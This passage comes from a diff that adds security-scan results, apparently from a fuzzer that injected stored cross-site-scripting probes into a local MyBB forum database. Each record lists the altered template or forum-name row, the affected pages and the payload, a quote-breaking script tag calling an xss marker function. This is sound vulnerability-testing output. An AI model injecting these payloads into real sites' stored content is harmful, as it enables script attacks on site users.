+	lang.select2_inputtooshort_plural = ""{$lang->select2_inputtooshort_plural}"";
+	lang.select2_inputtoolong_single = ""{$lang->select2_inputtoolong_single}"";
+	lang.select2_inputtoolong_plural = ""{$lang->select2_inputtoolong_plural}"";
+	lang.select2_selectiontoobig_single = ""{$lang->select2_selectiontoobig_single}"";
+	lang.select2_selectiontoobig_plural = ""{$lang->select2_selectiontoobig_plural}"";
+	lang.select2_loadmore = ""{$lang->select2_loadmore}"";
+	lang.select2_searching = ""{$lang->select2_searching}"";
+
+	var templates = {
+		modal: '{$jsTemplates['modal']}',
+		modal_button: '{$jsTemplates['modal_button']}'
+	};
+
+	var cookieDomain = ""{$mybb->settings['cookiedomain']}"";
+	var cookiePath = ""{$mybb->settings['cookiepath']}"";
+	var cookiePrefix = ""{$mybb->settings['cookieprefix']}"";
+	var cookieSecureFlag = ""{$mybb->settings['cookiesecureflag']}"";
+	var deleteevent_confirm = ""{$lang->deleteevent_confirm}"";
+	var removeattach_confirm = ""{$lang->removeattach_confirm}"";
+	var loading_text = '{$lang->ajax_loading}';
+	var saving_changes = '{$lang->saving_changes}';
+	var use_xmlhttprequest = ""{$mybb->settings['use_xmlhttprequest']}"";
+	var my_post_key = ""{$mybb->post_code}"";
+	var rootpath = ""{$mybb->settings['bburl']}"";
+	var imagepath = ""{$theme['imgdir']}"";
+  	var yes_confirm = ""{$lang->yes}"";
+	var no_confirm = ""{$lang->no}"";
+	var MyBBEditor = null;
+	var spinner_image = ""{$theme['imgdir']}/spinner.gif"";
+	var spinner = ""<img src='"" + spinner_image +""' alt='' />"";
+	var modal_zindex = 9999;
+// -->
+</script>' => '""'><script>xss(953736)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/misc.php?action=markread,957799,"""'><script>xss(957799)</script>","
+            mybb.mybb_templates.template[968][2]
+            original row: [969, 'redirect', '<html>\n<head>\n<title>{$title}</title>\n<meta http-equiv=""refresh"" content=""2;URL={$url}"" />\n{$headerinclude}\n</head>\n<body>\n<br />\n<br />\n<br />\n<br />\n<div style=""margin: auto auto; width: {$lang->redirect_width}"" align=""center"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead""><strong>{$title}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"" align=""center""><p>{$message}</p></td>\n</tr>\n<tr>\n<td class=""trow2"" align=""right""><a href=""{$url}""><span class=""smalltext"">{$lang->click_no_wait}</span></a></td>\n</tr>\n</table>\n</div>\n</body>\n</html>', -2, '120', '', 1676537388]
+            fuzzed row: [969, 'redirect', '""\'><script>xss(957799)</script>', -2, '120', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$title}</title>
+<meta http-equiv=""refresh"" content=""2;URL={$url}"" />
+{$headerinclude}
+</head>
+<body>
+<br />
+<br />
+<br />
+<br />
+<div style=""margin: auto auto; width: {$lang->redirect_width}"" align=""center"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead""><strong>{$title}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"" align=""center""><p>{$message}</p></td>
+</tr>
+<tr>
+<td class=""trow2"" align=""right""><a href=""{$url}""><span class=""smalltext"">{$lang->click_no_wait}</span></a></td>
+</tr>
+</table>
+</div>
+</body>
+</html>' => '""'><script>xss(957799)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/misc.php?action=syndication,957983,"""'><script>xss(957983)</script>","
+            mybb.mybb_templates.template[307][2]
+            original row: [308, 'misc_syndication', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->syndication}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n{$feedurl}\n<table border=""0"" cellspacing=""0"" cellpadding=""{$theme[\'tablespace\']}"" width=""100%"">\n<tr><td>{$lang->syndication_note}</td></tr>\n</table>\n<br />\n<form method=""post"" action=""misc.php?action=syndication"">\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td class=""thead"" colspan=""2""><strong>{$lang->syndication}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"" width=""40%"" valign=""top""><strong>{$lang->syndication_forum}</strong><br /><span class=""smalltext"">{$lang->syndication_forum_desc}</span></td>\n<td class=""trow1"" width=""60%"">{$forumselect}</td>\n</tr>\n<tr>\n<td class=""trow2"" width=""40%"" valign=""top""><strong>{$lang->syndication_version}</strong><br /><span class=""smalltext"">{$lang->syndication_version_desc}</span></td>\n<td class=""trow2"" width=""60%""><input type=""radio"" class=""radio"" name=""version"" value=""rss2.0"" {$rss2check} />&nbsp;{$lang->syndication_version_rss2}<br /><input type=""radio"" class=""radio"" name=""version"" value=""atom1.0"" {$atom1check} />&nbsp;{$lang->syndication_version_atom1}<br /><input type=""radio"" class=""radio"" name=""version"" value=""json"" {$json1check} />&nbsp;{$lang->syndication_version_json1}</td>\n</tr>\n<tr>\n<td class=""trow1"" width=""40%"" valign=""top""><strong>{$lang->syndication_limit}</strong><br /><span class=""smalltext"">{$lang->syndication_limit_desc}</span></td>\n<td class=""trow1"" width=""60%""><input type=""text"" class=""textbox"" name=""limit"" value=""{$limit}"" size=""3"" /> {$lang->syndication_threads_time}</td>\n</tr></table>\n<br />\n<div align=""center""><input type=""submit"" class=""button"" name=""make"" value=""{$lang->syndication_generate}"" /></div>\n</form>\n{$footer}\n</body>\n</html>', -2, '1821', '', 1676537388]
+            fuzzed row: [308, 'misc_syndication', '""\'><script>xss(957983)</script>', -2, '1821', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->syndication}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+{$feedurl}
+<table border=""0"" cellspacing=""0"" cellpadding=""{$theme['tablespace']}"" width=""100%"">
+<tr><td>{$lang->syndication_note}</td></tr>
+</table>
+<br />
+<form method=""post"" action=""misc.php?action=syndication"">
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td class=""thead"" colspan=""2""><strong>{$lang->syndication}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"" width=""40%"" valign=""top""><strong>{$lang->syndication_forum}</strong><br /><span class=""smalltext"">{$lang->syndication_forum_desc}</span></td>
+<td class=""trow1"" width=""60%"">{$forumselect}</td>
+</tr>
+<tr>
+<td class=""trow2"" width=""40%"" valign=""top""><strong>{$lang->syndication_version}</strong><br /><span class=""smalltext"">{$lang->syndication_version_desc}</span></td>
+<td class=""trow2"" width=""60%""><input type=""radio"" class=""radio"" name=""version"" value=""rss2.0"" {$rss2check} />&nbsp;{$lang->syndication_version_rss2}<br /><input type=""radio"" class=""radio"" name=""version"" value=""atom1.0"" {$atom1check} />&nbsp;{$lang->syndication_version_atom1}<br /><input type=""radio"" class=""radio"" name=""version"" value=""json"" {$json1check} />&nbsp;{$lang->syndication_version_json1}</td>
+</tr>
+<tr>
+<td class=""trow1"" width=""40%"" valign=""top""><strong>{$lang->syndication_limit}</strong><br /><span class=""smalltext"">{$lang->syndication_limit_desc}</span></td>
+<td class=""trow1"" width=""60%""><input type=""text"" class=""textbox"" name=""limit"" value=""{$limit}"" size=""3"" /> {$lang->syndication_threads_time}</td>
+</tr></table>
+<br />
+<div align=""center""><input type=""submit"" class=""button"" name=""make"" value=""{$lang->syndication_generate}"" /></div>
+</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(957983)</script>'
+            
+fuzzed after scan 200 / 302
+found as XSS in scan 201 / 302"
+mybb,mybb_forums.name,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/archive/index.php
+http://localhost/mybb/archive/index.php?forum-1.html
+http://localhost/mybb/archive/index.php?forum-2.html
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top
+http://localhost/mybb/misc.php?action=syndication
+http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top",958348,"""'><script>xss(958348)</script>","
+            mybb.mybb_forums.name[1][1]
+            original row: [2, 'My Forum', '', '', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            fuzzed row: [2, '""\'><script>xss(958348)</script>', '', '', 'f', 1, '1,2', 1, 1, 1, 0, 0, 0, '0', 0, 0, '', 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, '', 1, 0, 0, 0, '', '', 0, 0, 0, 0, 0, '', '']
+            change: 'My Forum' => '""'><script>xss(958348)</script>'
+            
+fuzzed after scan 24 / 302
+found as XSS in scan 25 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/#top
+http://localhost/mybb/calendar.php?calendar=1
+http://localhost/mybb/forumdisplay.php?fid=1
+http://localhost/mybb/forumdisplay.php?fid=2
+http://localhost/mybb/index.php#top
+http://localhost/mybb/member.php?action=emailuser&uid=
+http://localhost/mybb/member.php?action=profile&uid=
+http://localhost/mybb/online.php#top
+http://localhost/mybb/portal.php#top
+http://localhost/mybb/search.php#top
+http://localhost/mybb/stats.php#top",958490,"""'><script>xss(958490)</script>","
+            mybb.mybb_templates.template[971][2]
+            original row: [972, 'task_image', '<img src=""{$mybb->settings[\'bburl\']}/task.php"" width=""1"" height=""1"" alt="""" />', -2, '1800', '', 1676537388]
+            fuzzed row: [972, 'task_image', '""\'><script>xss(958490)</script>', -2, '1800', '', 1676537388]
+            change: '<img src=""{$mybb->settings['bburl']}/task.php"" width=""1"" height=""1"" alt="""" />' => '""'><script>xss(958490)</script>'
+            
+fuzzed after scan 216 / 302
+found as XSS in scan 217 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/calendar.php
+http://localhost/mybb/calendar.php?calendar=1",960022,"""'><script>xss(960022)</script>","
+            mybb.mybb_templates.template[3][2]
+            original row: [4, 'calendar', '<html>\n<head>\n\t<title>{$mybb->settings[\'bbname\']} - {$lang->calendar}</title>\n\t{$headerinclude}\n</head>\n<body>\n\t{$header}\n\t<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n\t\t<thead>\n\t\t\t<tr>\n\t\t\t\t<td class=""thead"" colspan=""8"">\n\t\t\t\t\t<div class=""float_right"">\n\t\t\t\t\t\t{$prev_month_link}{$sep}{$next_month_link}\n\t\t\t\t\t</div>\n\t\t\t\t\t<div><strong>{$monthnames[$month]} {$year}</strong></div>\n\t\t\t\t</td>\n\t\t\t</tr>\n\t\t\t<tr>\n\t\t\t\t<td class=""tcat"">&nbsp;</td>\n\t\t\t{$weekday_headers}\n\t\t\t</tr>\n\t\t</thead>\n\t\t<tbody>\n\t\t{$calendar_rows}\n\t\t</tbody>\n\t</table>\n<br />\n<form action=""calendar.php"" method=""post"">\n\t<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n\t\t<tr>\n\t\t\t<td class=""trow1"">\n\t\t\t\t<table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"">\n\t\t\t\t\t<tr>\n\t\t\t\t\t\t<td valign=""top"">{$addevent}</td>\n\t\t\t\t\t\t<td align=""right"">\n\t\t\t\t\t\t<span class=""smalltext""><strong>{$lang->jump_month}</strong></span>\n\t\t\t\t\t\t<select name=""month"">\n\t\t\t\t\t\t\t<option value=""{$month}"">{$monthnames[$month]}</option>\n\t\t\t\t\t\t\t<option value=""{$month}"">----------</option>\n\t\t\t\t\t\t\t<option value=""1"">{$lang->alt_month_1}</option>\n\t\t\t\t\t\t\t<option value=""2"">{$lang->alt_month_2}</option>\n\t\t\t\t\t\t\t<option value=""3"">{$lang->alt_month_3}</option>\n\t\t\t\t\t\t\t<option value=""4"">{$lang->alt_month_4}</option>\n\t\t\t\t\t\t\t<option value=""5"">{$lang->alt_month_5}</option>\n\t\t\t\t\t\t\t<option value=""6"">{$lang->alt_month_6}</option>\n\t\t\t\t\t\t\t<option value=""7"">{$lang->alt_month_7}</option>\n\t\t\t\t\t\t\t<option value=""8"">{$lang->alt_month_8}</option>\n\t\t\t\t\t\t\t<option value=""9"">{$lang->alt_month_9}</option>\n\t\t\t\t\t\t\t<option value=""10"">{$lang->alt_month_10}</option>\n\t\t\t\t\t\t\t<option value=""11"">{$lang->alt_month_11}</option>\n\t\t\t\t\t\t\t<option value=""12"">{$lang->alt_month_12}</option>\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t<select name=""year"">\n\t\t\t\t\t\t\t<option value=""{$year}"">{$year}</option>\n\t\t\t\t\t\t\t<option value=""{$year}"">----------</option>\n\t\t\t\t\t\t\t{$yearsel}\n\t\t\t\t\t\t</select>\n\t\t\t\t\t\t{$gobutton}\n\t\t\t\t\t\t<br />\n\t\t\t\t\t\t{$calendar_jump}\n\t\t\t\t\t\t</td>\n\t\t\t\t\t</tr>\n\t\t\t\t</table>\n\t\t\t</td>\n\t\t</tr>\n\t\t</table>\n\t</form>\n{$footer}\n</body>\n</html>', -2, '1813', '', 1676537388]
+            fuzzed row: [4, 'calendar', '""\'><script>xss(960022)</script>', -2, '1813', '', 1676537388]
+            change: '<html>
+<head>
+	<title>{$mybb->settings['bbname']} - {$lang->calendar}</title>
+	{$headerinclude}
+</head>
+<body>
+	{$header}
+	<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+		<thead>
+			<tr>
+				<td class=""thead"" colspan=""8"">
+					<div class=""float_right"">
+						{$prev_month_link}{$sep}{$next_month_link}
+					</div>
+					<div><strong>{$monthnames[$month]} {$year}</strong></div>
+				</td>
+			</tr>
+			<tr>
+				<td class=""tcat"">&nbsp;</td>
+			{$weekday_headers}
+			</tr>
+		</thead>
+		<tbody>
+		{$calendar_rows}
+		</tbody>
+	</table>
+<br />
+<form action=""calendar.php"" method=""post"">
+	<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+		<tr>
+			<td class=""trow1"">
+				<table width=""100%"" cellspacing=""0"" cellpadding=""0"" border=""0"">
+					<tr>
+						<td valign=""top"">{$addevent}</td>
+						<td align=""right"">
+						<span class=""smalltext""><strong>{$lang->jump_month}</strong></span>
+						<select name=""month"">
+							<option value=""{$month}"">{$monthnames[$month]}</option>
+							<option value=""{$month}"">----------</option>
+							<option value=""1"">{$lang->alt_month_1}</option>
+							<option value=""2"">{$lang->alt_month_2}</option>
+							<option value=""3"">{$lang->alt_month_3}</option>
+							<option value=""4"">{$lang->alt_month_4}</option>
+							<option value=""5"">{$lang->alt_month_5}</option>
+							<option value=""6"">{$lang->alt_month_6}</option>
+							<option value=""7"">{$lang->alt_month_7}</option>
+							<option value=""8"">{$lang->alt_month_8}</option>
+							<option value=""9"">{$lang->alt_month_9}</option>
+							<option value=""10"">{$lang->alt_month_10}</option>
+							<option value=""11"">{$lang->alt_month_11}</option>
+							<option value=""12"">{$lang->alt_month_12}</option>
+						</select>
+						<select name=""year"">
+							<option value=""{$year}"">{$year}</option>
+							<option value=""{$year}"">----------</option>
+							{$yearsel}
+						</select>
+						{$gobutton}
+						<br />
+						{$calendar_jump}
+						</td>
+					</tr>
+				</table>
+			</td>
+		</tr>
+		</table>
+	</form>
+{$footer}
+</body>
+</html>' => '""'><script>xss(960022)</script>'
+            
+fuzzed after scan 193 / 302
+found as XSS in scan 194 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/search.php
+http://localhost/mybb/search.php#top",960663,"""'><script>xss(960663)</script>","
+            mybb.mybb_templates.template[710][2]
+            original row: [711, 'search', '<html>\n<head>\n<title>{$mybb->settings[\'bbname\']} - {$lang->search}</title>\n{$headerinclude}\n</head>\n<body>\n{$header}\n<form action=""search.php"">\n<input type=""hidden"" name=""action"" value=""do_search"" />\n<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<tr>\n<td colspan=""2"" class=""thead""><strong>{$lang->search}</strong></td>\n</tr>\n<tr>\n<td class=""tcat"" width=""50%""><strong>{$lang->search_keyword}</strong></td>\n<td class=""tcat"" width=""50%""><strong>{$lang->search_username}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"">\n<table><tr>\n<td valign=""top""><input type=""text"" class=""textbox"" name=""keywords"" size=""35"" maxlength=""250"" /></td>\n</tr>\n<tr>\n<td>\n<span class=""smalltext""><input type=""radio"" class=""radio"" name=""postthread"" value=""1"" checked=""checked"" />{$lang->search_entire_post}<br /><input type=""radio"" class=""radio"" name=""postthread"" value=""2"" />{$lang->search_titles_only}</span></td>\n</tr></table>\n</td>\n<td class=""trow1"">\n<input type=""text"" class=""textbox"" id=""author"" name=""author"" size=""35"" maxlength=""{$mybb->settings[\'maxnamelength\']}"" /><br /><span class=""smalltext""><input type=""checkbox"" class=""checkbox"" name=""matchusername"" value=""1"" checked=""checked"" /> {$lang->match_username}</span>\n</td>\n</tr>\n<tr>\n<td class=""tcat""><strong>{$lang->search_forums}</strong></td>\n<td class=""tcat""><strong>{$lang->search_options}</strong></td>\n</tr>\n<tr>\n<td class=""trow1 no_bottom_border"" rowspan=""{$rowspan}"">{$srchlist}</td>\n<td class=""trow1"">\n<select name=""findthreadst"">\n<option value=""1"">{$lang->threads_at_least}</option>\n<option value=""2"">{$lang->threads_at_most}</option>\n</select> <input type=""text"" class=""textbox"" name=""numreplies"" size=""2"" maxlength=""4"" />&nbsp;{$lang->replies2}<br />\n<br />\n<select name=""postdate"">\n<option value=""0"">{$lang->find_anydate}</option>\n<option value=""1"">{$lang->find_yesterday}</option>\n<option value=""7"">{$lang->find_lastweek}</option>\n<option value=""14"">{$lang->find_2weeks}</option>\n<option value=""30"">{$lang->find_month}</option>\n<option value=""90"">{$lang->find_3months}</option>\n<option value=""180"">{$lang->find_6months}</option>\n<option value=""365"">{$lang->find_year}</option>\n</select>&nbsp;&nbsp; <input type=""radio"" class=""radio"" name=""pddir"" value=""1"" checked=""checked"" />{$lang->and_newer}  <input type=""radio"" class=""radio"" name=""pddir"" value=""0"" />{$lang->and_older}<br />\n<br />\n{$prefixselect}\n</td>\n</tr>\n<tr>\n<td class=""tcat""><strong>{$lang->sorting_options}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"">\n<select name=""sortby"">\n<option value=""lastpost"">{$lang->sort_lastpost}</option>\n<option value=""starter"">{$lang->sort_author}</option>\n<option value=""forum"">{$lang->sort_forum}</option>\n<option value=""views"">{$lang->sort_views}</option>\n<option value=""replies"">{$lang->sort_replies}</option>\n</select> {$lang->sort_in} <input type=""radio"" class=""radio"" name=""sortordr"" value=""asc"" />{$lang->sort_asc} <input type=""radio"" class=""radio"" name=""sortordr"" value=""desc"" checked=""checked"" />{$lang->sort_desc} {$lang->sort_order}\n</td>\n</tr>\n<tr>\n<td class=""tcat""><strong>{$lang->display_options}</strong></td>\n</tr>\n<tr>\n<td class=""trow1"">{$lang->show_results_as} <input type=""radio"" class=""radio"" name=""showresults"" value=""threads"" checked=""checked"" />{$lang->show_results_threads} <input type=""radio"" class=""radio"" name=""showresults"" value=""posts"" />{$lang->show_results_posts}</td>\n</tr>\n{$moderator_options}\n</table>\n<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>\n</form>\n{$footer}\n<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">\n<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>\n<script type=""text/javascript"">\n<!--\nif(use_xmlhttprequest == ""1"")\n{\n\tMyBB.select2();\n\t$(""#author"").select2({\n\t\tplaceholder: ""{$lang->search_user}"",\n\t\tminimumInputLength: 2,\n\t\tmultiple: false,\n\t\tallowClear: true,\n\t\tajax: { // instead of writing the function to execute the request we use Select2\'s convenient helper\n\t\t\turl: ""xmlhttp.php?action=get_users"",\n\t\t\tdataType: \'json\',\n\t\t\tdata: function (term, page) {\n\t\t\t\treturn {\n\t\t\t\t\tquery: term, // search term\n\t\t\t\t};\n\t\t\t},\n\t\t\tresults: function (data, page) { // parse the results into the format expected by Select2.\n\t\t\t\t// since we are using custom formatting functions we do not need to alter remote JSON data\n\t\t\t\treturn {results: data};\n\t\t\t}\n\t\t},\n\t\tinitSelection: function(element, callback) {\n\t\t\tvar value = $(element).val();\n\t\t\tif (value !== """") {\n\t\t\t\tcallback({\n\t\t\t\t\tid: value,\n\t\t\t\t\ttext: value\n\t\t\t\t});\n\t\t\t}\n\t\t},\n\t});\n}\n// -->\n</script>\n</body>\n</html>', -2, '1823', '', 1676537388]
+            fuzzed row: [711, 'search', '""\'><script>xss(960663)</script>', -2, '1823', '', 1676537388]
+            change: '<html>
+<head>
+<title>{$mybb->settings['bbname']} - {$lang->search}</title>
+{$headerinclude}
+</head>
+<body>
+{$header}
+<form action=""search.php"">
+<input type=""hidden"" name=""action"" value=""do_search"" />
+<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<tr>
+<td colspan=""2"" class=""thead""><strong>{$lang->search}</strong></td>
+</tr>
+<tr>
+<td class=""tcat"" width=""50%""><strong>{$lang->search_keyword}</strong></td>
+<td class=""tcat"" width=""50%""><strong>{$lang->search_username}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"">
+<table><tr>
+<td valign=""top""><input type=""text"" class=""textbox"" name=""keywords"" size=""35"" maxlength=""250"" /></td>
+</tr>
+<tr>
+<td>
+<span class=""smalltext""><input type=""radio"" class=""radio"" name=""postthread"" value=""1"" checked=""checked"" />{$lang->search_entire_post}<br /><input type=""radio"" class=""radio"" name=""postthread"" value=""2"" />{$lang->search_titles_only}</span></td>
+</tr></table>
+</td>
+<td class=""trow1"">
+<input type=""text"" class=""textbox"" id=""author"" name=""author"" size=""35"" maxlength=""{$mybb->settings['maxnamelength']}"" /><br /><span class=""smalltext""><input type=""checkbox"" class=""checkbox"" name=""matchusername"" value=""1"" checked=""checked"" /> {$lang->match_username}</span>
+</td>
+</tr>
+<tr>
+<td class=""tcat""><strong>{$lang->search_forums}</strong></td>
+<td class=""tcat""><strong>{$lang->search_options}</strong></td>
+</tr>
+<tr>
+<td class=""trow1 no_bottom_border"" rowspan=""{$rowspan}"">{$srchlist}</td>
+<td class=""trow1"">
+<select name=""findthreadst"">
+<option value=""1"">{$lang->threads_at_least}</option>
+<option value=""2"">{$lang->threads_at_most}</option>
+</select> <input type=""text"" class=""textbox"" name=""numreplies"" size=""2"" maxlength=""4"" />&nbsp;{$lang->replies2}<br />
+<br />
+<select name=""postdate"">
+<option value=""0"">{$lang->find_anydate}</option>
+<option value=""1"">{$lang->find_yesterday}</option>
+<option value=""7"">{$lang->find_lastweek}</option>
+<option value=""14"">{$lang->find_2weeks}</option>
+<option value=""30"">{$lang->find_month}</option>
+<option value=""90"">{$lang->find_3months}</option>
+<option value=""180"">{$lang->find_6months}</option>
+<option value=""365"">{$lang->find_year}</option>
+</select>&nbsp;&nbsp; <input type=""radio"" class=""radio"" name=""pddir"" value=""1"" checked=""checked"" />{$lang->and_newer}  <input type=""radio"" class=""radio"" name=""pddir"" value=""0"" />{$lang->and_older}<br />
+<br />
+{$prefixselect}
+</td>
+</tr>
+<tr>
+<td class=""tcat""><strong>{$lang->sorting_options}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"">
+<select name=""sortby"">
+<option value=""lastpost"">{$lang->sort_lastpost}</option>
+<option value=""starter"">{$lang->sort_author}</option>
+<option value=""forum"">{$lang->sort_forum}</option>
+<option value=""views"">{$lang->sort_views}</option>
+<option value=""replies"">{$lang->sort_replies}</option>
+</select> {$lang->sort_in} <input type=""radio"" class=""radio"" name=""sortordr"" value=""asc"" />{$lang->sort_asc} <input type=""radio"" class=""radio"" name=""sortordr"" value=""desc"" checked=""checked"" />{$lang->sort_desc} {$lang->sort_order}
+</td>
+</tr>
+<tr>
+<td class=""tcat""><strong>{$lang->display_options}</strong></td>
+</tr>
+<tr>
+<td class=""trow1"">{$lang->show_results_as} <input type=""radio"" class=""radio"" name=""showresults"" value=""threads"" checked=""checked"" />{$lang->show_results_threads} <input type=""radio"" class=""radio"" name=""showresults"" value=""posts"" />{$lang->show_results_posts}</td>
+</tr>
+{$moderator_options}
+</table>
+<div align=""center""><br /><input type=""submit"" class=""button"" name=""submit"" value=""{$lang->search}"" /></div>
+</form>
+{$footer}
+<link rel=""stylesheet"" href=""{$mybb->asset_url}/jscripts/select2/select2.css?ver=1807"">
+<script type=""text/javascript"" src=""{$mybb->asset_url}/jscripts/select2/select2.min.js?ver=1806""></script>
+<script type=""text/javascript"">
+<!--
+if(use_xmlhttprequest == ""1"")
+{
+	MyBB.select2();
+	$(""#author"").select2({
+		placeholder: ""{$lang->search_user}"",
+		minimumInputLength: 2,
+		multiple: false,
+		allowClear: true,
+		ajax: { // instead of writing the function to execute the request we use Select2's convenient helper
+			url: ""xmlhttp.php?action=get_users"",
+			dataType: 'json',
+			data: function (term, page) {
+				return {
+					query: term, // search term
+				};
+			},
+			results: function (data, page) { // parse the results into the format expected by Select2.
+				// since we are using custom formatting functions we do not need to alter remote JSON data
+				return {results: data};
+			}
+		},
+		initSelection: function(element, callback) {
+			var value = $(element).val();
+			if (value !== """") {
+				callback({
+					id: value,
+					text: value
+				});
+			}
+		},
+	});
+}
+// -->
+</script>
+</body>
+</html>' => '""'><script>xss(960663)</script>'
+            
+fuzzed after scan 210 / 302
+found as XSS in scan 211 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/
+http://localhost/mybb/#top
+http://localhost/mybb/index.php
+http://localhost/mybb/index.php#top",962004,"""'><script>xss(962004)</script>","
+            mybb.mybb_templates.template[71][2]
+            original row: [72, 'forumbit_depth1_cat', '<table border=""0"" cellspacing=""{$theme[\'borderwidth\']}"" cellpadding=""{$theme[\'tablespace\']}"" class=""tborder"">\n<thead>\n<tr>\n<td class=""thead{$expthead}"" colspan=""5"">\n<div class=""expcolimage""><img src=""{$theme[\'imgdir\']}/{$expcolimage}"" id=""cat_{$forum[\'fid\']}_img"" class=""expander"" alt=""{$expaltext}"" title=""{$expaltext}"" /></div>\n<div><strong><a href=""{$forum_url}"">{$forum[\'name\']}</a></strong><br /><div class=""smalltext"">{$forum[\'description\']}</div></div>\n</td>\n</tr>\n</thead>\n<tbody style=""{$expdisplay}"" id=""cat_{$forum[\'fid\']}_e"">\n<tr>\n<td class=""tcat"" colspan=""2""><span class=""smalltext""><strong>{$lang->forumbit_forum}</strong></span></td>\n<td class=""tcat"" width=""85"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_threads}</strong></span></td>\n<td class=""tcat"" width=""85"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_posts}</strong></span></td>\n<td class=""tcat"" width=""200"" align=""center""><span class=""smalltext""><strong>{$lang->forumbit_lastpost}</strong></span></td>\n</tr>\n{$sub_forums}\n</tbody>\n</table>\n<br />', -2, '1800', '', 1676537388]
+            fuzzed row: [72, 'forumbit_depth1_cat', '""\'><script>xss(962004)</script>', -2, '1800', '', 1676537388]
+            change: '<table border=""0"" cellspacing=""{$theme['borderwidth']}"" cellpadding=""{$theme['tablespace']}"" class=""tborder"">
+<thead>
+<tr>
+<td class=""thead{$expthead}"" colspan=""5"">
+<div class=""expcolimage""><img src=""{$theme['imgdir']}/{$expcolimage}"" id=""cat_{$forum['fid']}_img"" class=""expander"" alt=""{$expaltext}"" title=""{$expaltext}"" /></div>
+<div><strong><a href=""{$forum_url}"">{$forum['name']}</a></strong><br /><div class=""smalltext"">{$forum['description']}</div></div>
+</td>
+</tr>
+</thead>
+<tbody style=""{$expdisplay}"" id=""cat_{$forum['fid']}_e"">
+<tr>
+<td class=""tcat"" colspan=""2""><span class=""smalltext""><strong>{$lang->forumbit_forum}</strong></span></td>
+<td class=""tcat"" width=""85"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_threads}</strong></span></td>
+<td class=""tcat"" width=""85"" align=""center"" style=""white-space: nowrap""><span class=""smalltext""><strong>{$lang->forumbit_posts}</strong></span></td>
+<td class=""tcat"" width=""200"" align=""center""><span class=""smalltext""><strong>{$lang->forumbit_lastpost}</strong></span></td>
+</tr>
+{$sub_forums}
+</tbody>
+</table>
+<br />' => '""'><script>xss(962004)</script>'
+            
+fuzzed after scan 194 / 302
+found as XSS in scan 195 / 302"
+mybb,mybb_templates.template,http://localhost/mybb/showteam.php,962605,"""'><script>xss(962605)</script>","
+            mybb.mybb_templates.template[589][2]
+            original row: [590, 'postbit_email', '<a href=""member.php?action=emailuser&amp;uid={$post[\'uid\']}"" title=""{$lang->postbit_email}"" class=""postbit_email""><span>{$lang->postbit_button_email}</span></a>', -2, '1800', '', 1676537388]
+            fuzzed row: [590, 'postbit_email', '""\'><script>xss(962605)</script>', -2, '1800', '', 1676537388]
+            change: '<a href=""member.php?action=emailuser&amp;uid={$post['uid']}"" title=""{$lang->postbit_email}"" class=""postbit_email""><span>{$lang->postbit_button_email}</span></a>' => '""'><script>xss(962605)</script>'
+            
+fuzzed after scan 206 / 302
+found as XSS in scan 207 / 302"
+mybb,mybb_templates.template,"http://localhost/mybb/calendar.php
